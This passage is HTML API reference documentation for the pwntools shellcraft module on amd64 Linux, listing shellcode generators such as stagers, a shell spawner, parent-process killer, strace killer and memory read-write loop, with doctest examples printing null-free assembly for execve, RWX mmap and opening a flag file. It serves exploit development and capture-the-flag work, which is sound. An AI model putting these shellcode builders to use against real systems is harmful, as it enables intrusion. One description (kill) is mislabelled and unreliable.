</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.linux.forkexit">
<code class="descclassname">pwnlib.shellcraft.amd64.linux.</code><code class="descname">forkexit</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/linux/forkexit.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.linux.forkexit" title="Permalink to this definition">¶</a></dt>
<dd><p>Attempts to fork.  If the fork is successful, the parent exits.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.linux.getpid">
<code class="descclassname">pwnlib.shellcraft.amd64.linux.</code><code class="descname">getpid</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/linux/getpid.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.linux.getpid" title="Permalink to this definition">¶</a></dt>
<dd><p>Retrieve the current PID</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.linux.kill">
<code class="descclassname">pwnlib.shellcraft.amd64.linux.</code><code class="descname">kill</code><span class="sig-paren">(</span><em>pid</em>, <em>signal='SIGKILL'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/linux/kill.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.linux.kill" title="Permalink to this definition">¶</a></dt>
<dd><p>Writes a string to a file descriptor</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.linux.killparent">
<code class="descclassname">pwnlib.shellcraft.amd64.linux.</code><code class="descname">killparent</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/linux/killparent.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.linux.killparent" title="Permalink to this definition">¶</a></dt>
<dd><p>Kills its parent process until whatever the parent is (probably init)
cannot be killed any longer.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.linux.listen">
<code class="descclassname">pwnlib.shellcraft.amd64.linux.</code><code class="descname">listen</code><span class="sig-paren">(</span><em>port</em>, <em>network</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/linux/listen.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.linux.listen" title="Permalink to this definition">¶</a></dt>
<dd><p>Listens on a TCP port, accept a client and leave his socket in RAX.
Port is the TCP port to listen on, network is either &#8216;ipv4&#8217; or &#8216;ipv6&#8217;.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.linux.loader">
<code class="descclassname">pwnlib.shellcraft.amd64.linux.</code><code class="descname">loader</code><span class="sig-paren">(</span><em>address</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/linux/loader.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.linux.loader" title="Permalink to this definition">¶</a></dt>
<dd><p>Loads a statically-linked ELF into memory and transfers control.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>address</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Address of the ELF as a register or integer.</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.linux.loader_append">
<code class="descclassname">pwnlib.shellcraft.amd64.linux.</code><code class="descname">loader_append</code><span class="sig-paren">(</span><em>data=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/linux/loader_append.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.linux.loader_append" title="Permalink to this definition">¶</a></dt>
<dd><p>Loads a statically-linked ELF into memory and transfers control.</p>
<p>Similar to loader.asm but loads an appended ELF.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; If a valid filename, the data is loaded from the named file.
Otherwise, this is treated as raw ELF data to append.
If <code class="docutils literal"><span class="pre">None</span></code>, it is ignored.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">gcc</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s1">&#39;gcc&#39;</span><span class="p">,</span><span class="s1">&#39;-m64&#39;</span><span class="p">,</span><span class="s1">&#39;-xc&#39;</span><span class="p">,</span><span class="s1">&#39;-static&#39;</span><span class="p">,</span><span class="s1">&#39;-Wl,-Ttext-segment=0x20000000&#39;</span><span class="p">,</span><span class="s1">&#39;-&#39;</span><span class="p">])</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">gcc</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;&#39;&#39;</span>
<span class="gp">... </span><span class="s1">int main() {</span>
<span class="gp">... </span><span class="s1">    printf(&quot;Hello, </span><span class="si">%s</span><span class="s1">!</span><span class="se">\\</span><span class="s1">n&quot;, &quot;amd64&quot;);</span>
<span class="gp">... </span><span class="s1">}</span>
<span class="gp">... </span><span class="s1">&#39;&#39;&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">gcc</span><span class="o">.</span><span class="n">shutdown</span><span class="p">(</span><span class="s1">&#39;send&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">gcc</span><span class="o">.</span><span class="n">poll</span><span class="p">(</span><span class="kc">True</span><span class="p">)</span>
<span class="go">0</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">loader_append</span><span class="p">(</span><span class="s1">&#39;a.out&#39;</span><span class="p">)</span>
</pre></div>
</div>
<p>The following doctest is commented out because it doesn&#8217;t work on Travis
for reasons I cannot diagnose.  However, it should work just fine :-)</p>
<blockquote>
<div># &gt;&gt;&gt; run_assembly(sc).recvline() == &#8216;Hello, amd64!n&#8217;
# True</div></blockquote>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.linux.membot">
<code class="descclassname">pwnlib.shellcraft.amd64.linux.</code><code class="descname">membot</code><span class="sig-paren">(</span><em>readsock=0</em>, <em>writesock=1</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/linux/membot.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.linux.membot" title="Permalink to this definition">¶</a></dt>
<dd><p>Read-write access to a remote process&#8217; memory.</p>
<p>Provide a single pointer-width value to determine the operation to perform:</p>
<ul class="simple">
<li>0: Exit the loop</li>
<li>1: Read data</li>
<li>2: Write data</li>
</ul>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.linux.migrate_stack">
<code class="descclassname">pwnlib.shellcraft.amd64.linux.</code><code class="descname">migrate_stack</code><span class="sig-paren">(</span><em>size=1048576</em>, <em>fd=0</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/linux/migrate_stack.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.linux.migrate_stack" title="Permalink to this definition">¶</a></dt>
<dd><p>Migrates to a new stack.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.linux.mmap_rwx">
<code class="descclassname">pwnlib.shellcraft.amd64.linux.</code><code class="descname">mmap_rwx</code><span class="sig-paren">(</span><em>size=4096</em>, <em>protection=7</em>, <em>address=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/linux/mmap_rwx.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.linux.mmap_rwx" title="Permalink to this definition">¶</a></dt>
<dd><p>Maps some memory</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.linux.read">
<code class="descclassname">pwnlib.shellcraft.amd64.linux.</code><code class="descname">read</code><span class="sig-paren">(</span><em>fd=0</em>, <em>buffer='rsp'</em>, <em>count=8</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/linux/read.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.linux.read" title="Permalink to this definition">¶</a></dt>
<dd><p>Reads data from the file descriptor into the provided buffer.
This is a one-shot and does not fill the request.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.linux.read_upto">
<code class="descclassname">pwnlib.shellcraft.amd64.linux.</code><code class="descname">read_upto</code><span class="sig-paren">(</span><em>fd=0</em>, <em>buffer='rsp'</em>, <em>sizereg='rdx'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/linux/read_upto.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.linux.read_upto" title="Permalink to this definition">¶</a></dt>
<dd><p>Reads up to N bytes 8 bytes into the specified register</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.linux.readfile">
<code class="descclassname">pwnlib.shellcraft.amd64.linux.</code><code class="descname">readfile</code><span class="sig-paren">(</span><em>path</em>, <em>dst='rdi'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/linux/readfile.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.linux.readfile" title="Permalink to this definition">¶</a></dt>
<dd><p>Args: [path, dst (imm/reg) = rdi ]
Opens the specified file path and sends its content to the specified file descriptor.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.linux.readinto">
<code class="descclassname">pwnlib.shellcraft.amd64.linux.</code><code class="descname">readinto</code><span class="sig-paren">(</span><em>sock=0</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/linux/readinto.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.linux.readinto" title="Permalink to this definition">¶</a></dt>
<dd><p>Reads into a buffer of a size and location determined at runtime.
When the shellcode is executing, it should send a pointer and
pointer-width size to determine the location and size of buffer.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.linux.readloop">
<code class="descclassname">pwnlib.shellcraft.amd64.linux.</code><code class="descname">readloop</code><span class="sig-paren">(</span><em>sock=0</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/linux/readloop.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.linux.readloop" title="Permalink to this definition">¶</a></dt>
<dd><p>Reads into a buffer of a size and location determined at runtime.
When the shellcode is executing, it should send a pointer and
pointer-width size to determine the location and size of buffer.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.linux.readn">
<code class="descclassname">pwnlib.shellcraft.amd64.linux.</code><code class="descname">readn</code><span class="sig-paren">(</span><em>fd</em>, <em>buf</em>, <em>nbytes</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/linux/readn.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.linux.readn" title="Permalink to this definition">¶</a></dt>
<dd><p>Reads exactly nbytes bytes from file descriptor fd into the buffer buf.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>fd</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; fd</li>
<li><strong>buf</strong> (<em>void</em>) &#8211; buf</li>
<li><strong>nbytes</strong> (<em>size_t</em>) &#8211; nbytes</li>
</ul>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.linux.readptr">
<code class="descclassname">pwnlib.shellcraft.amd64.linux.</code><code class="descname">readptr</code><span class="sig-paren">(</span><em>fd=0</em>, <em>target_reg='rdx'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/linux/readptr.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.linux.readptr" title="Permalink to this definition">¶</a></dt>
<dd><p>Reads 8 bytes into the specified register</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.linux.recvsize">
<code class="descclassname">pwnlib.shellcraft.amd64.linux.</code><code class="descname">recvsize</code><span class="sig-paren">(</span><em>sock</em>, <em>reg='rcx'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/linux/recvsize.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.linux.recvsize" title="Permalink to this definition">¶</a></dt>
<dd><p>Recives 4 bytes size field
Useful in conjuncion with findpeer and stager
:param sock, the socket to read the payload from.:
:param reg, the place to put the size:
:type reg, the place to put the size: default ecx</p>
<p>Leaves socket in ebx</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.linux.setregid">
<code class="descclassname">pwnlib.shellcraft.amd64.linux.</code><code class="descname">setregid</code><span class="sig-paren">(</span><em>gid='egid'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/linux/setregid.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.linux.setregid" title="Permalink to this definition">¶</a></dt>
<dd><p>Args: [gid (imm/reg) = egid]
Sets the real and effective group id.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.linux.setreuid">
<code class="descclassname">pwnlib.shellcraft.amd64.linux.</code><code class="descname">setreuid</code><span class="sig-paren">(</span><em>uid='euid'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/linux/setreuid.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.linux.setreuid" title="Permalink to this definition">¶</a></dt>
<dd><p>Args: [uid (imm/reg) = euid]
Sets the real and effective user id.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.linux.sh">
<code class="descclassname">pwnlib.shellcraft.amd64.linux.</code><code class="descname">sh</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/linux/sh.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.linux.sh" title="Permalink to this definition">¶</a></dt>
<dd><p>Execute a different process.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">p</span> <span class="o">=</span> <span class="n">run_assembly</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;echo Hello&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<span class="go">&#39;Hello\n&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.linux.socket">
<code class="descclassname">pwnlib.shellcraft.amd64.linux.</code><code class="descname">socket</code><span class="sig-paren">(</span><em>network='ipv4'</em>, <em>proto='tcp'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/linux/socket.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.linux.socket" title="Permalink to this definition">¶</a></dt>
<dd><p>Creates a new socket</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.linux.stage">
<code class="descclassname">pwnlib.shellcraft.amd64.linux.</code><code class="descname">stage</code><span class="sig-paren">(</span><em>fd=0</em>, <em>length=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/linux/stage.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.linux.stage" title="Permalink to this definition">¶</a></dt>
<dd><p>Migrates shellcode to a new buffer.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>fd</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Integer file descriptor to recv data from.
Default is stdin (0).</li>
<li><strong>length</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Optional buffer length.  If None, the first pointer-width
of data received is the length.</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">p</span> <span class="o">=</span> <span class="n">run_assembly</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">stage</span><span class="p">())</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">echo</span><span class="p">(</span><span class="s2">&quot;Hello</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">constants</span><span class="o">.</span><span class="n">STDOUT_FILENO</span><span class="p">))</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sc</span><span class="p">))</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">sc</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="go">&#39;Hello\n&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.linux.stager">
<code class="descclassname">pwnlib.shellcraft.amd64.linux.</code><code class="descname">stager</code><span class="sig-paren">(</span><em>sock</em>, <em>size</em>, <em>handle_error=False</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/linux/stager.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.linux.stager" title="Permalink to this definition">¶</a></dt>
<dd><p>Recives a fixed sized payload into a mmaped buffer
Useful in conjuncion with findpeer.
After running the socket will be left in RDI.
:param sock, the socket to read the payload from.:
:param size, the size of the payload:</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.linux.strace_dos">
<code class="descclassname">pwnlib.shellcraft.amd64.linux.</code><code class="descname">strace_dos</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/linux/strace_dos.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.linux.strace_dos" title="Permalink to this definition">¶</a></dt>
<dd><p>Kills strace</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.linux.syscall">
<code class="descclassname">pwnlib.shellcraft.amd64.linux.</code><code class="descname">syscall</code><span class="sig-paren">(</span><em>syscall=None</em>, <em>arg0=None</em>, <em>arg1=None</em>, <em>arg2=None</em>, <em>arg3=None</em>, <em>arg4=None</em>, <em>arg5=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/linux/syscall.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.linux.syscall" title="Permalink to this definition">¶</a></dt>
<dd><dl class="docutils">
<dt>Args: [syscall_number, *args]</dt>
<dd>Does a syscall</dd>
</dl>
<p>Any of the arguments can be expressions to be evaluated by <code class="xref py py-func docutils literal"><span class="pre">pwnlib.constants.eval()</span></code>.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">syscall</span><span class="p">(</span><span class="s1">&#39;SYS_execve&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;rsp&#39;</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* call execve(1, &#39;rsp&#39;, 2, 0) */</span>
<span class="go">    xor r10d, r10d /* 0 */</span>
<span class="go">    push SYS_execve /* 0x3b */</span>
<span class="go">    pop rax</span>
<span class="go">    push 1</span>
<span class="go">    pop rdi</span>
<span class="go">    push 2</span>
<span class="go">    pop rdx</span>
<span class="go">    mov rsi, rsp</span>
<span class="go">    syscall</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">syscall</span><span class="p">(</span><span class="s1">&#39;SYS_execve&#39;</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* call execve(2, 1, 0, -1) */</span>
<span class="go">    push -1</span>
<span class="go">    pop r10</span>
<span class="go">    push SYS_execve /* 0x3b */</span>
<span class="go">    pop rax</span>
<span class="go">    push 2</span>
<span class="go">    pop rdi</span>
<span class="go">    push 1</span>
<span class="go">    pop rsi</span>
<span class="go">    cdq /* rdx=0 */</span>
<span class="go">    syscall</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">syscall</span><span class="p">()</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* call syscall() */</span>
<span class="go">    syscall</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">syscall</span><span class="p">(</span><span class="s1">&#39;rax&#39;</span><span class="p">,</span> <span class="s1">&#39;rdi&#39;</span><span class="p">,</span> <span class="s1">&#39;rsi&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* call syscall(&#39;rax&#39;, &#39;rdi&#39;, &#39;rsi&#39;) */</span>
<span class="go">    /* setregs noop */</span>
<span class="go">    syscall</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">syscall</span><span class="p">(</span><span class="s1">&#39;rbp&#39;</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* call syscall(&#39;rbp&#39;, ?, ?, 1) */</span>
<span class="go">    mov rax, rbp</span>
<span class="go">    push 1</span>
<span class="go">    pop rdx</span>
<span class="go">    syscall</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">syscall</span><span class="p">(</span>
<span class="gp">... </span>              <span class="s1">&#39;SYS_mmap&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span>
<span class="gp">... </span>              <span class="s1">&#39;PROT_READ | PROT_WRITE | PROT_EXEC&#39;</span><span class="p">,</span>
<span class="gp">... </span>              <span class="s1">&#39;MAP_PRIVATE | MAP_ANONYMOUS&#39;</span><span class="p">,</span>
<span class="gp">... </span>              <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* call mmap(0, 4096, &#39;PROT_READ | PROT_WRITE | PROT_EXEC&#39;, &#39;MAP_PRIVATE | MAP_ANONYMOUS&#39;, -1, 0) */</span>
<span class="go">    push (MAP_PRIVATE | MAP_ANONYMOUS) /* 0x22 */</span>
<span class="go">    pop r10</span>
<span class="go">    push -1</span>
<span class="go">    pop r8</span>
<span class="go">    xor r9d, r9d /* 0 */</span>
<span class="go">    push SYS_mmap /* 9 */</span>
<span class="go">    pop rax</span>
<span class="go">    xor edi, edi /* 0 */</span>
<span class="go">    push (PROT_READ | PROT_WRITE | PROT_EXEC) /* 7 */</span>
<span class="go">    pop rdx</span>
<span class="go">    mov esi, 0x1010101 /* 4096 == 0x1000 */</span>
<span class="go">    xor esi, 0x1011101</span>
<span class="go">    syscall</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">&#39;/home/pwn/flag&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* open(file=&#39;/home/pwn/flag&#39;, oflag=0, mode=0) */</span>
<span class="go">    /* push &#39;/home/pwn/flag\x00&#39; */</span>
<span class="go">    mov rax, 0x101010101010101</span>
<span class="go">    push rax</span>
<span class="go">    mov rax, 0x101010101010101 ^ 0x67616c662f6e</span>
<span class="go">    xor [rsp], rax</span>
<span class="go">    mov rax, 0x77702f656d6f682f</span>
<span class="go">    push rax</span>
<span class="go">    mov rdi, rsp</span>
<span class="go">    xor edx, edx /* 0 */</span>
<span class="go">    xor esi, esi /* 0 */</span>
<span class="go">    /* call open() */</span>
<span class="go">    push SYS_open /* 2 */</span>
<span class="go">    pop rax</span>
<span class="go">    syscall</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.linux.writeloop">
<code class="descclassname">pwnlib.shellcraft.amd64.linux.</code><code class="descname">writeloop</code><span class="sig-paren">(</span><em>readsock=0</em>, <em>writesock=1</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/linux/writeloop.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.linux.writeloop" title="Permalink to this definition">¶</a></dt>
<dd><p>Reads from a buffer of a size and location determined at runtime.
When the shellcode is executing, it should send a pointer and
pointer-width size to determine the location and size of buffer.</p>
</dd></dl>

</div>
</div>
<span id="document-shellcraft/arm"></span><div class="section" id="pwnlib-shellcraft-arm-shellcode-for-arm">
